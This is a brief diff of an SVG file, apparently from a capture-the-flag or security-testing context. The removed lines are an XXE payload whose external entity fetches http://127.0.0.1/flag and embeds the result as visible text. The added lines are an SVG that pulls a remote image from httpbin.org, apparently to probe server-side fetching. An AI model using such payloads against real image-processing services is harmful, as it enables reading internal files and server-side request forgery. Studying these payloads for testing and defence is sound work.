@@ -1,9 +1,6 @@
-<?xml version="1.0" standalone="yes"?>
-<!DOCTYPE svg [
-  <!ENTITY flag SYSTEM "http://127.0.0.1/flag">
-]>
-<svg xmlns="http://www.w3.org/2000/svg" width="800" height="200">
-  <rect width="800" height="200" fill="#0e0e10"/>
-  <text x="10" y="80" fill="#e8a020" font-size="22"
-        font-family="monospace" xml:space="preserve">&flag;</text>
+<svg xmlns="http://www.w3.org/2000/svg"
+     xmlns:xlink="http://www.w3.org/1999/xlink"
+     width="500" height="500">
+  <image xlink:href="https://httpbin.org/image/png"
+         x="0" y="0" width="500" height="500"/>
 </svg>
